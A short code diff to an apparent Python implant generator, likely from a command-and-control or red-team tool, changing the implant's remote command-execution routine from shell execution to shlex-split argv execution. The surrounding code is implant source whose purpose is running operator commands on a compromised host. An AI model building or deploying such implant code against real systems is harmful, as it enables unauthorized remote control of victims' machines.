@@ -169,6 +169,7 @@ def generate_python_implant(
         import os
         import platform
         import random
+        import shlex
         import socket
         import struct
         import subprocess
@@ -429,18 +430,15 @@ def generate_python_implant(
         # ─── Command Execution ────────────────────────────────────────
 
         def _execute_command(cmd: str) -> dict:
-            """Execute a shell command and capture output."""
+            """Execute a bounded argv command without invoking a shell."""
             try:
-                if sys.platform == "win32":
-                    proc = subprocess.run(
-                        cmd, shell=True, capture_output=True,
-                        text=True, timeout=120,
-                    )
-                else:
-                    proc = subprocess.run(
-                        ["/bin/sh", "-c", cmd],
-                        capture_output=True, text=True, timeout=120,
-                    )
+                argv = shlex.split(cmd, posix=sys.platform != "win32")
+                if not argv:
+                    return {{"output": "", "error": "Empty command"}}
+                proc = subprocess.run(
+                    argv, shell=False, capture_output=True,
+                    text=True, timeout=120,
+                )
                 return {{
                     "output": proc.stdout[:32000],
                     "error": proc.stderr[:8000] if proc.returncode != 0 else "",
